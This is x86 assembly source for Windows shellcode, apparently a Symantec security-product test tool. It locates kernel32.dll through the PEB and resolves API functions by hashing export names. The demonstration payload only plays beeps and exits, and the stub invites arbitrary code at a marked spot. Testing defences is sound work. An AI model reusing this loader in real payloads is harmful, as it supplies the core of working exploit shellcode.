; ---------------------------------------------------------------------------
; Symantec ATP Sirius Test Tools
; Author: Greg Hoglund
; Note: shellcode based on prior published work / training materials owned by Greg
; Note: modified for Symantec purposes, free to use for any purpose
;
;
; if used with the XOR decoder, we enter our code with EBP having
; our current location.  We can use any code we want here without worrying
; about NULL bytes.
; ---------------------------------------------------------------------------
BITS 32
	; ---- shellcode starts here
	; ---- get the base address of kernel32.dll
	mov	eax, [FS:0x30]	; PEB structure
	mov	eax, [eax+0x0C]	; PEB_LDR_DATA structure
	mov 	esi, [eax+0x1C]	; Head of loaded module list
	lodsd
	mov	edx, [eax+0x08]	; edx now has base of kernel32.dll
	
	; ---- this loops through our DATA1 table and gets
	;      the function pointers 
	push	ebp		; save current location pointer
	add	ebp, DATA1	; ebp now has _real_ DATA1 location
load_loop:	
	mov	ecx, [ebp]	; ecx gets our hard coded hash
	call	pGetExp		; function address returned in esi
	mov	[ebp], esi
	add	ebp, 4		; increment to next entry
	cmp	dword [ebp], -1	; -1 marks the end of the table
	jne	load_loop	; loop back and do next entry
	
	pop	ebp		; get back the original location ptr
	jmp	PUT_CODE_HERE	; done loading so jump to user code	
	
	
pGetExp:
	; ---- Procedure to load the function pointer from
	;      KERNEL32.DLL	
	mov	esi, edx
	movzx	ebx, word [esi + 0x3C]	
	mov	esi, [esi+ebx+0x78]	; PE directory data
	lea	esi, [edx+esi+0x1C]
	lodsd				; address of functions
	add	eax, edx		; rva2va
	push	eax
	lodsd				; address of names
	add 	eax, edx		; rva2va
	push	eax
	lodsd				; address of name ordinals
	add	eax, edx		; rva2va
	pop	ebx			; ebx has address of names
	push 	eax
	
	; ---- hash the names now
	xor	eax, eax		; index starts at zero
i3:	mov	esi, [4*eax+ebx]	; ptr to symbol name
	add	esi, edx		; rva2va
					; esi now points to ASCII name
					; of function
					
	push	ebx			; address of name table
	push	eax			; index
	xor	ebx, ebx
i4:	xor 	eax, eax
	lodsb
	rol	ebx, 5
	add 	ebx, eax
	cmp	eax, 0
	jnz	i4
	ror	ebx, 5
	cmp	ebx, ecx	; compare hash against the arg in ecx
	pop	eax
	pop	ebx
	je i5
	inc	eax
	jmp	i3
i5:	pop	ebx
	movzx	esi, word [2*eax+ebx]
	pop	eax
	mov	esi, [4*esi+eax]	; esi is set for our 'return value'
	add	esi, edx
	ret

PUT_CODE_HERE:
	; -- make way for the stack
	add		esp, -2004
	
	; ---- use the loaded functions at will
	push	3000		; 3 second duration
	push	2600		; for a test, play a little tone
	call	[_Beep+ebp]	; our pointers are offset from curr location
	push	400			
	push	4100		
	call	[_Beep+ebp]	
	push	2000		
	push	2400		
	call	[_Beep+ebp]	
	push	4100		
	push	400			
	call	[_Beep+ebp]	
	push	2400		
	push	100			
	call	[_Beep+ebp]	
	
	push	-1
	call	[_ExitProcess+ebp]
	; ---- DONE! ----
	
	; ---------------------------------------------------------
	; ---- load with checksums of function name
	; calc as follows, h has final value:
	;char _c[] = "LoadLibraryA";
	;char *c = _c;
	;unsigned int h=0;
	;while(*c) 
	;{
	;	h = ( (h<<5)|(h>>27) ) + (*c);
	;	c++;
	;}
DATA1:
_LoadLibrary:		dd	0x331ADDDC
_GetProcAddess:		dd	0x99C95590
_Beep				dd	0x0022A110
_ExitProcess		dd	0xEC468F87
_end_sentinel:		dd	0xFFFFFFFF

			; ---- extra data follows
_MyURL:			db	"http://10.0.0.5",0
